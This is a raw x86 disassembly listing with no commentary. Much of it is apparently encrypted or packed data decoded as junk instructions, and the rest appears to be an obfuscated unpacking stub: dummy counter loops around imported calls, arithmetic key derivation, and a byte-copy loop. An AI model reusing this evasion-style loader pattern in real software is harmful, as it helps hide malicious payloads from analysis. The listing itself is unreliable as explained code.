  4100fb:	add    DWORD PTR [edi+ebx*2-0x71],0xffffff8b
  410100:	mov    ecx,0xf849c68c
  410105:	icebp  
  410106:	lods   al,BYTE PTR ds:[esi]
  410107:	xchg   ebx,eax
  410108:	dec    edx
  410109:	push   edx
  41010a:	and    bl,BYTE PTR [esi]
  41010c:	xor    al,0x5a
  41010e:	adc    ch,BYTE PTR [eax-0x5e]
  410111:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  410113:	call   0x88e6c7da
  410118:	push   edi
  410119:	push   ecx
  41011a:	shl    BYTE PTR [eax],0x61
  41011d:	jbe    0x41012e
  41011f:	inc    eax
  410120:	in     eax,dx
  410121:	stc    
  410122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410123:	iret   
  410124:	xchg   DWORD PTR [ebp-0x509dbb7c],ebx
  41012a:	cdq    
  41012b:	das    
  41012c:	or     dl,BYTE PTR [edi]
  41012e:	jb     0x4100c7
  410130:	inc    edi
  410131:	jle    0x410144
  410133:	or     ah,bh
  410135:	jmp    0x4101a6
  410137:	mov    ds:0x4ff16816,al
  41013c:	push   ebp
  41013d:	retf   0xce05
  410140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410141:	mov    esp,0xb57e0aad
  410146:	dec    ebx
  410147:	dec    eax
  410148:	xor    al,0x81
  41014a:	test   al,0x18
  41014c:	dec    ebp
  41014d:	xor    cl,dh
  41014f:	dec    edx
  410150:	sub    bl,BYTE PTR [edx]
  410152:	cmp    dh,bl
  410154:	jmp    0x4100ef
  410156:	shr    DWORD PTR [ecx+0x40],0x7
  41015a:	in     eax,0xe2
  41015c:	adc    BYTE PTR [ecx+0x9],ch
  41015f:	pop    edx
  410160:	push   ss
  410161:	icebp  
  410162:	lahf   
  410163:	xor    eax,0x65b49140
  410168:	xchg   ebx,eax
  410169:	(bad)  
  41016a:	aad    0x2e
  41016c:	add    DWORD PTR [bp-0x15],edi
  410170:	push   0x27c848cd
  410175:	sub    al,0x37
  410177:	std    
  410178:	imul   edi,DWORD PTR [esi+0x507af326],0x38
  41017f:	sbb    al,0x70
  410181:	(bad)  
  410182:	adc    al,0x8a
  410184:	sbb    edi,DWORD PTR [edx+0x20]
  410187:	fistp  DWORD PTR [esi+0xd4fadef]
  41018d:	adc    BYTE PTR [edx-0xf],cl
  410190:	pop    ecx
  410191:	lea    ebp,[esi+0x6b09bf96]
  410197:	lahf   
  410198:	jmp    0x410121
  41019a:	pop    ds
  41019b:	fdiv   DWORD PTR [eax-0x18]
  41019e:	xor    al,ah
  4101a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101a1:	cmp    DWORD PTR [ebx-0x41e258d5],edx
  4101a7:	cli    
  4101a8:	xor    DWORD PTR [edx+eiz*4+0x1d],ecx
  4101ac:	sar    BYTE PTR [ebx-0x31],0xae
  4101b0:	gs pop edi
  4101b2:	pop    ds
  4101b3:	loop   0x41017c
  4101b5:	mov    dl,0xb
  4101b7:	mov    ds:0x7098fb91,al
  4101bc:	out    0xd5,al
  4101be:	xchg   ecx,eax
  4101bf:	fmul   st,st(5)
  4101c1:	push   cs
  4101c2:	stc    
  4101c3:	ss xchg edx,eax
  4101c5:	in     eax,dx
  4101c6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4101c8:	and    DWORD PTR [ecx],ebx
  4101ca:	jle    0x4101fb
  4101cc:	add    esi,DWORD PTR [eax]
  4101ce:	mov    bh,BYTE PTR [ecx-0x32359528]
  4101d4:	jp     0x4101fe
  4101d6:	fs cs hlt 
  4101d9:	shl    BYTE PTR [edi-0x5b028ad1],cl
  4101df:	je     0x4101d7
  4101e1:	div    DWORD PTR [ebp-0x71d1f554]
  4101e7:	in     eax,0xb6
  4101e9:	inc    edx
  4101ea:	leave  
  4101eb:	xchg   BYTE PTR [ecx-0x24],dl
  4101ee:	push   eax
  4101ef:	(bad)  
  4101f0:	mov    ebp,0xe4961bf2
  4101f5:	push   ss
  4101f6:	mov    ebx,0xc9fb1f09
  4101fb:	push   edi
  4101fc:	icebp  
  4101fd:	(bad)  
  4101fe:	adc    eax,0xacabd33f
  410203:	loopne 0x410237
  410205:	jle    0x4101de
  410207:	sbb    eax,0xd19f0c89
  41020c:	pop    ebp
  41020d:	pop    ebp
  41020e:	fdivr  QWORD PTR [edx+edi*8-0x7d]
  410212:	or     eax,0xb4b812f2
  410217:	arpl   WORD PTR [ecx],di
  410219:	and    eax,0x458fd318
  41021e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41021f:	sbb    eax,0x1f843b29
  410224:	xchg   edx,eax
  410225:	or     ch,BYTE PTR [esi]
  410227:	jge    0x41022b
  410229:	enter  0x85d,0xba
  41022d:	aaa    
  41022e:	sar    BYTE PTR [ecx-0x6e6c376],1
  410234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410235:	pop    es
  410236:	inc    edx
  410237:	adc    eax,0x27a8206d
  41023c:	mov    ds:0x7b0d1091,eax
  410241:	xor    al,0x54
  410243:	sti    
  410244:	call   0x49f5:0xdfaaa725
  41024b:	mov    al,0x7b
  41024d:	fisttp DWORD PTR [eax]
  41024f:	sets   BYTE PTR [edx+eax*2+0x7f]
  410254:	jge    0x41028b
  410256:	or     DWORD PTR [esi+0x22dd0184],0xa6a6b99
  410260:	sbb    eax,0x178121a3
  410265:	stos   DWORD PTR es:[edi],eax
  410266:	jle    0x4101f6
  410268:	xor    ch,al
  41026a:	fwait
  41026b:	gs (bad) 
  41026d:	jae    0x4102e8
  41026f:	call   0x73819a1e
  410274:	jnp    0x410253
  410276:	pop    eax
  410277:	push   eax
  410278:	test   DWORD PTR [esi],eax
  41027a:	lds    ebp,FWORD PTR [esi]
  41027c:	xchg   ecx,eax
  41027d:	ins    BYTE PTR es:[edi],dx
  41027e:	pop    ds
  41027f:	mov    bh,0x7e
  410281:	lds    esi,FWORD PTR [edx]
  410283:	adc    BYTE PTR [edx],dl
  410285:	sbb    edx,DWORD PTR [edi-0x2bea83eb]
  41028b:	push   ecx
  41028c:	sbb    eax,ecx
  41028e:	jbe    0x410301
  410290:	xchg   esi,eax
  410291:	cmp    dh,BYTE PTR [ebp+0x52]
  410294:	in     al,0x8b
  410296:	jne    0x410290
  410298:	mov    DWORD PTR ds:0x4336eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43360f,0x433703
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433613,0x12
  4102c6:	cmp    DWORD PTR ds:0x433613,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433613,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433613,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433613
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433613,eax
  410303:	mov    eax,ds:0x433613
  410308:	dec    eax
  410309:	mov    ds:0x433613,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43360f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43360f
  41036b:	inc    eax
  41036c:	mov    ds:0x43360f,eax
  410371:	cmp    DWORD PTR ds:0x43360f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43360f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43360f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43360f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43360f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43361f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43367f,0x4336bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433667
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x3cb4553f],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x410438
  4103eb:	pushf  
  4103ec:	mov    ebp,0xdbf600d0
  4103f1:	push   edi
  4103f2:	mov    al,0xa4
  4103f4:	leave  
  4103f5:	les    edx,FWORD PTR [eax+esi*8-0x25]
  4103f9:	push   es
  4103fa:	imul   edi,ecx,0x6afb7ca4
  410400:	or     eax,DWORD PTR [edx+0x279d69a1]
  410406:	adc    al,0x1e
  410408:	cmp    al,0x6c
  41040a:	xlat   BYTE PTR ds:[ebx]
  41040b:	hlt    
  41040c:	mov    bl,0x68
  41040e:	(bad)  
  41040f:	data16 stos BYTE PTR es:[edi],al
  410411:	mov    al,ds:0x8b81cc09
  410416:	shr    esp,1
  410418:	arpl   WORD PTR [esi],ax
  41041a:	fild   DWORD PTR [eax+ebp*4-0x5f148c46]
  410421:	adc    BYTE PTR [eax],bh
  410423:	not    DWORD PTR [edx-0xe]
  410426:	pop    eax
  410427:	jae    0x4103e4
  410429:	inc    esp
  41042a:	push   0xffffffde
  41042c:	aam    0xd4
  41042e:	sbb    eax,0xb96f06c9
  410433:	sti    
  410434:	sbb    BYTE PTR [eax*1+0x52b2386],dh
  41043b:	push   cs
  41043c:	cmp    BYTE PTR [esi+0x7c3b39bc],bh
  410442:	or     eax,0x1e2d6b93
  410447:	cdq    
  410448:	inc    ebp
  410449:	cmp    al,0x87
  41044b:	sub    eax,0x820c7ee
  410450:	ret    
  410451:	xchg   ebx,eax
  410452:	and    al,0x84
  410454:	daa    
  410455:	cli    
  410456:	cwde   
  410457:	jge    0x410456
  410459:	pop    eax
  41045a:	jnp    0x410484
  41045c:	daa    
  41045d:	and    al,0xf2
  41045f:	or     DWORD PTR [edi-0x3a],ecx
  410462:	fwait
  410463:	and    esi,DWORD PTR [eax-0x504cfb6a]
  410469:	test   eax,0x962cf4f3
  41046e:	adc    ebp,DWORD PTR ds:0xb40bca0c
  410474:	mov    dh,0x2c
  410476:	rcl    BYTE PTR [edi-0x6b],cl
  410479:	dec    BYTE PTR fs:[ecx+0x4d]
  41047d:	pop    edi
  41047e:	sbb    eax,0x64250048
  410483:	outs   dx,BYTE PTR ds:[esi]
  410484:	outs   dx,BYTE PTR ds:[esi]
  410485:	test   eax,0x9c5fa180
  41048a:	fsub   QWORD PTR [esi-0x47ba4364]
  410490:	addr16 inc edx
  410492:	lock mov WORD PTR [ecx-0x7c],ds
  410496:	pop    eax
  410497:	sub    eax,DWORD PTR [eax+0x3f30e2a]
  41049d:	add    eax,0x685f3c9d
  4104a2:	out    dx,al
  4104a3:	lods   al,BYTE PTR ds:[esi]
  4104a4:	or     al,0x86
  4104a6:	inc    esp
  4104a7:	xor    DWORD PTR [ebp+0x2d],ecx
  4104aa:	cmp    esi,edx
  4104ac:	(bad)  
  4104ad:	push   ss
  4104ae:	push   cs
  4104af:	out    dx,eax
  4104b0:	sbb    DWORD PTR [eax+edi*2],eax
  4104b3:	dec    edx
  4104b4:	shl    dh,0x65
  4104b7:	dec    ebp
  4104b8:	dec    edi
  4104b9:	(bad)  
  4104bb:	scas   eax,DWORD PTR es:[edi]
  4104bc:	sahf   
  4104bd:	push   ds
  4104be:	jcxz   0x41044b
  4104c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c2:	mov    ebx,esp
  4104c4:	push   ss
  4104c5:	pusha  
  4104c6:	loope  0x4104e4
  4104c8:	dec    ecx
  4104c9:	sub    DWORD PTR ds:0xdea734e2,esi
  4104cf:	add    al,0x1e
  4104d1:	inc    esp
  4104d2:	adc    BYTE PTR [eax-0x52],al
  4104d5:	out    dx,eax
  4104d6:	xchg   esi,eax
  4104d7:	pop    esi
  4104d8:	mov    eax,DWORD PTR [ebx+0x57f10a02]
  4104de:	jp     0x41053f
  4104e0:	add    al,0xdf
  4104e2:	out    dx,eax
  4104e3:	jo     0x4104ed
  4104e5:	(bad)  
  4104e6:	mov    esi,0xf79ba26c
  4104eb:	or     eax,0x18cda607
  4104f0:	ins    DWORD PTR es:[edi],dx
  4104f1:	xlat   BYTE PTR ds:[ebx]
  4104f2:	test   edx,edi
  4104f4:	adc    al,al
  4104f6:	jns    0x4104b0
  4104f8:	xchg   ebx,eax
  4104f9:	cld    
  4104fa:	cmc    
  4104fb:	imul   ebp,DWORD PTR [edx],0xc1e5b7a4
  410501:	adc    DWORD PTR [ecx],ecx
  410503:	std    
  410504:	mov    ah,0x5d
  410506:	rcl    DWORD PTR [edi+0x35],cl
  410509:	imul   ebp,ebx,0x58c207d4
  41050f:	or     BYTE PTR [esi],dl
  410511:	push   esp
  410512:	ss mov bh,0xab
  410515:	cld    
  410516:	punpcklbw mm3,DWORD PTR [eax+eiz*4-0x7aaa93e9]
  41051e:	(bad)  
  41051f:	pop    eax
  410520:	pop    ss
  410521:	js     0x4104ee
  410523:	push   cs
  410524:	sub    DWORD PTR [ecx-0x2eec026b],edx
  41052a:	int3   
  41052b:	cmp    bl,BYTE PTR [ecx+edi*8]
  41052e:	mov    al,ds:0x6fb524e8
  410533:	in     al,0x68
  410535:	and    ah,bh
  410537:	bound  ebp,QWORD PTR [ebp-0x41726d58]
  41053d:	out    0xcc,al
  41053f:	pop    edi
  410540:	cwde   
  410541:	fnstsw WORD PTR [esi+eiz*1]
  410544:	pop    esi
  410545:	test   BYTE PTR [ecx-0x29a1bcb4],0x65
  41054c:	sbb    eax,eax
  41054e:	call   0x706ad49e
  410553:	lock in al,dx
  410555:	mov    edx,0x767ae77b
  41055a:	in     eax,dx
  41055b:	jne    0x410553
  41055d:	std    
  41055e:	mov    WORD PTR [ebp-0x10],ds
  410561:	mov    dh,0xa1
  410563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410564:	adc    al,0x37
  410566:	hlt    
  410567:	ins    DWORD PTR es:[edi],dx
  410568:	push   ds
  410569:	stos   BYTE PTR es:[edi],al
  41056a:	test   DWORD PTR [edi],0xaa39095d
  410570:	mov    al,0xb5
  410572:	imul   esp,DWORD PTR [ebp+0x22c24bc1],0x63674ebe
  41057c:	xchg   esi,eax
  41057d:	ret    
  41057e:	adc    eax,0x10952316
  410583:	(bad)  
  410584:	pop    esp
  410585:	mov    ebx,0xd803e404
  41058a:	lahf   
  41058b:	(bad)  
  41058c:	std    
  41058d:	fisttp WORD PTR [edx+0x5954ead7]
  410593:	mov    BYTE PTR [esi-0x7dc2b331],ch
  410599:	pop    esp
  41059a:	dec    ecx
  41059b:	popa   
  41059c:	sub    dh,BYTE PTR [edi+0xc0b1c8d]
  4105a2:	push   ecx
  4105a3:	int    0x1c
  4105a5:	pop    edi
  4105a6:	sar    BYTE PTR [ebx],1
  4105a8:	sub    DWORD PTR [edi+eiz*4],ebx
  4105ab:	cld    
  4105ac:	sbb    al,0x7f
  4105ae:	pop    es
  4105af:	xor    dh,BYTE PTR [esp+esi*4+0x60]
  4105b3:	mov    ch,0x5
  4105b5:	ja     0x4105ad
  4105b7:	repz add DWORD PTR [ebx+edx*1+0x2a25241e],0xa
  4105c0:	sub    al,al
  4105c2:	push   ss
  4105c3:	mov    eax,ds:0x85efa345
  4105c8:	mov    al,0xcb
  4105ca:	or     edi,DWORD PTR [edi]
  4105cc:	stos   DWORD PTR es:[edi],eax
  4105cd:	and    BYTE PTR [ecx-0x5460ab6e],dl
  4105d3:	mov    ds:0x1d1702c,al
  4105d8:	inc    ebp
  4105d9:	test   DWORD PTR [ecx-0x40],ebx
  4105dc:	mov    ah,0x68
  4105de:	stos   BYTE PTR es:[edi],al
  4105df:	leave  
  4105e0:	lods   al,BYTE PTR ds:[esi]
  4105e1:	mov    bl,0x64
  4105e3:	ja     0x4105f1
  4105e5:	dec    ebx
  4105e6:	pop    eax
  4105e7:	pop    ss
  4105e8:	pop    ebx
  4105e9:	aam    0x96
  4105eb:	mov    dl,0x32
  4105ed:	pop    edi
  4105ee:	aas    
  4105ef:	das    
  4105f0:	sahf   
  4105f1:	cli    
  4105f2:	hlt    
  4105f3:	sahf   
  4105f4:	jecxz  0x410660
  4105f6:	xchg   al,al
  4105f8:	daa    
  4105f9:	fs pop esp
  4105fb:	inc    DWORD PTR [edi+ebp*8]
  4105fe:	ins    BYTE PTR es:[edi],dx
  4105ff:	aad    0xa0
  410601:	push   edi
  410602:	std    
  410603:	pushf  
  410604:	jmp    0x683e:0x61b38cda
  41060b:	xchg   esp,eax
  41060c:	push   esi
  41060d:	jns    0x4105f1
  41060f:	enter  0x5549,0x5e
  410613:	ins    DWORD PTR es:[edi],dx
  410614:	leave  
  410615:	rol    DWORD PTR [eax-0x126cff77],0xdc
  41061c:	dec    ebp
  41061d:	mov    ebp,0xba8dd1ef
  410622:	cld    
  410623:	std    
  410624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410625:	mov    ebx,0xd5103038
  41062a:	pop    eax
  41062b:	scas   al,BYTE PTR es:[edi]
  41062c:	jbe    0x41065e
  41062e:	call   0xcdcb:0x18fd9a74
  410635:	pushf  
  410636:	dec    edi
  410637:	imul   eax,DWORD PTR [ecx-0x26baf336],0x6f
  41063e:	mov    bh,0xf5
  410640:	adc    BYTE PTR [esi+eax*1+0x37046ba5],bh
  410647:	cli    
  410648:	cdq    
  410649:	push   esi
  41064a:	stc    
  41064b:	inc    esp
  41064c:	or     bh,BYTE PTR es:[edx-0x7e]
  410650:	jl     0x410658
  410652:	xchg   ebp,eax
  410653:	jmp    0x410611
  410655:	xchg   BYTE PTR [eax],dh
  410657:	test   al,0x44
  410659:	push   0x3c206611
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433613,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433613
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433613,edx
  41067c:	cmp    DWORD PTR ds:0x433613,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433613,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4336ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43361b
  4106ad:	mov    DWORD PTR ds:0x4336ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433633,0x17
  4106c0:	cmp    DWORD PTR ds:0x433633,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433633,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4337fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433633,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433633
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433633,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433633
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433633,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4336f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4336b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433617,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433627,0x4336ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107d5:	push   es
  4107d6:	xchg   DWORD PTR [ecx+edx*4-0x45],ecx
  4107da:	jle    0x41085a
  4107dc:	jmp    0x22c8:0xf17e7e7c
  4107e3:	mov    dl,0x95
  4107e5:	add    ch,BYTE PTR [ecx+0x16]
  4107e8:	and    ecx,DWORD PTR [edx+0x59be403a]
  4107ee:	sbb    al,0x67
  4107f0:	push   edx
  4107f1:	fld    TBYTE PTR [ebx+0x63]
  4107f4:	dec    ebp
  4107f5:	(bad)  
  4107f6:	nop
  4107f7:	(bad)  
  4107f8:	jl     0x4107d5
  4107fa:	gs adc al,0xc7
  4107fd:	or     eax,0xcce106c8
  410802:	sbb    ch,BYTE PTR [eax+0x6acc84c6]
  410808:	sub    ebx,DWORD PTR [esi-0x1a]
  41080b:	xchg   esi,eax
  41080c:	xchg   esi,eax
  41080d:	mov    ah,0x5
  41080f:	outs   dx,DWORD PTR ds:[esi]
  410810:	push   0xf1e70b36
  410815:	ret    
  410816:	es jmp 0x7b2ebe76
  41081c:	enter  0xbc3d,0x6d
  410820:	sub    ch,bh
  410822:	(bad)  
  410823:	pusha  
  410824:	pop    edx
  410825:	fldln2 
  410827:	pop    ds
  410828:	mov    edi,0xdbf022e7
  41082d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41082e:	mov    ecx,0x975bd155
  410833:	fidiv  WORD PTR [ebx]
  410835:	adc    bl,cl
  410837:	push   esi
  410838:	fidiv  WORD PTR [esi-0x40]
  41083b:	retf   0x2c8b
  41083e:	push   ss
  41083f:	xchg   esp,eax
  410840:	es (bad) 
  410842:	int3   
  410843:	or     DWORD PTR [ebx-0x47],edi
  410846:	shr    BYTE PTR [esi+0x42],1
  410849:	and    DWORD PTR [eax-0x5b],0x1ecead45
  410850:	push   es
  410851:	xchg   esi,eax
  410852:	and    edx,DWORD PTR [esi]
  410854:	jg     0x410889
  410856:	enter  0xdf0e,0x16
  41085a:	push   ebp
  41085b:	pop    ebp
  41085c:	cdq    
  41085d:	cwde   
  41085e:	(bad)  
  410860:	mov    eax,0x985325
  410865:	ror    BYTE PTR [edx+0x61],1
  410868:	push   ds
  410869:	jg     0x410840
  41086b:	jle    0x4108cc
  41086d:	pop    ds
  41086e:	add    esp,DWORD PTR cs:[ebx-0x69]
  410872:	pop    edx
  410873:	cmp    al,0x15
  410875:	xor    eax,DWORD PTR [edi]
  410877:	bound  esi,QWORD PTR [eax+edi*8-0x7a0faccc]
  41087e:	imul   edi,ebx,0xffffffc5
  410881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410882:	pop    esi
  410883:	addr16 mov es,eax
  410886:	hlt    
  410887:	js     0x4108ec
  410889:	sub    BYTE PTR [edi-0x7],al
  41088c:	inc    esp
  41088d:	icebp  
  41088e:	cmp    BYTE PTR [edx-0x569e266f],dl
  410894:	inc    BYTE PTR [esi+0x1a98964c]
  41089a:	in     al,dx
  41089b:	cmp    al,0x15
  41089d:	fidivr DWORD PTR [esi]
  41089f:	aad    0xfe
  4108a1:	shl    BYTE PTR [edi+0x22],0xd8
  4108a5:	sbb    ecx,DWORD PTR [edi+0x5b]
  4108a8:	dec    eax
  4108a9:	xchg   esi,eax
  4108aa:	ja     0x410858
  4108ac:	ret    0xbe5
  4108af:	(bad)  
  4108b1:	dec    ecx
  4108b2:	dec    edx
  4108b3:	out    dx,eax
  4108b4:	and    eax,0xef300c60
  4108ba:	add    al,0xef
  4108bc:	int3   
  4108bd:	adc    eax,0xa4398688
  4108c2:	or     DWORD PTR [edx+0x3373c250],0x614ba17f
  4108cc:	int3   
  4108cd:	not    DWORD PTR [edi]
  4108cf:	mov    ds:0x61928494,al
  4108d4:	shl    ah,0x74
  4108d7:	add    al,0x26
  4108d9:	dec    esp
  4108da:	lods   al,BYTE PTR ds:[esi]
  4108db:	ja     0x41092e
  4108dd:	mov    ebp,0x59e92bd8
  4108e3:	adc    al,0x7
  4108e5:	stos   DWORD PTR es:[edi],eax
  4108e6:	cmc    
  4108e7:	adc    DWORD PTR ds:0xa931c9bc,esi
  4108ed:	(bad)  
  4108ee:	stos   DWORD PTR es:[edi],eax
  4108ef:	es call 0x314a608b
  4108f5:	adc    dl,ch
  4108f7:	outs   dx,BYTE PTR ds:[esi]
  4108f8:	pop    eax
  4108f9:	daa    
  4108fa:	mov    al,0xf9
  4108fc:	push   ss
  4108fd:	call   0x744cb05e
  410902:	out    0x18,al
  410904:	int    0xd4
  410906:	std    
  410907:	push   0x6d
  410909:	iret   
  41090a:	(bad)  
  41090b:	pop    ebp
  41090c:	sub    DWORD PTR [ebx-0x32],eax
  41090f:	dec    edx
  410910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410911:	mov    dh,0x96
  410913:	dec    ebx
  410914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410915:	out    0x78,al
  410917:	jo     0x4108ee
  410919:	add    bh,cl
  41091b:	das    
  41091c:	mov    dh,0x88
  41091e:	in     al,0xc8
  410920:	(bad)  
  410921:	mov    ecx,0x96e9c191
  410926:	fidivr DWORD PTR [ebp+0x6565d7c1]
  41092c:	fcmovbe st,st(7)
  41092e:	xchg   edx,eax
  41092f:	(bad)  [eax]
  410931:	test   eax,0x4c2d36e9
  410936:	add    DWORD PTR [esi-0xc],esi
  410939:	jno    0x41091b
  41093b:	dec    ebx
  41093c:	inc    eax
  41093d:	push   es
  41093e:	mov    ch,0xbb
  410940:	xor    BYTE PTR [ecx],dl
  410942:	add    DWORD PTR [eax+0x1f189e24],edx
  410948:	fidivr DWORD PTR [ecx+0x38]
  41094b:	inc    ecx
  41094c:	les    edx,FWORD PTR [ebx+0x4143d066]
  410952:	lds    ebx,FWORD PTR [esi+0xa3906f1]
  410958:	and    al,0xa7
  41095a:	fwait
  41095b:	mov    al,ds:0x481f7fae
  410960:	mov    ebp,0x63eb503b
  410965:	push   0xad643989
  41096a:	add    ah,BYTE PTR [ebx+0x26]
  41096d:	enter  0xda4,0x41
  410971:	xchg   edx,eax
  410972:	or     edi,eax
  410974:	repnz mov edi,0xb451d8b4
  41097a:	icebp  
  41097b:	leave  
  41097c:	push   eax
  41097d:	call   0x7295:0xd2f3ea98
  410984:	mov    esp,0x5bdee332
  410989:	fwait
  41098a:	lahf   
  41098b:	xchg   BYTE PTR [edx+0x66d0864a],cl
  410991:	mov    al,0xec
  410993:	test   al,0x86
  410995:	mov    bh,0x4a
  410997:	jle    0x410941
  410999:	ffreep st(0)
  41099b:	fisttp WORD PTR [edi]
  41099d:	cmp    ecx,esi
  41099f:	or     eax,0xd3834109
  4109a4:	arpl   ax,si
  4109a6:	repnz icebp 
  4109a8:	xchg   ecx,eax
  4109a9:	adc    al,BYTE PTR [ebx+edi*4-0x29396da4]
  4109b0:	repz xor BYTE PTR fs:[ecx+0xeaf5895],dl
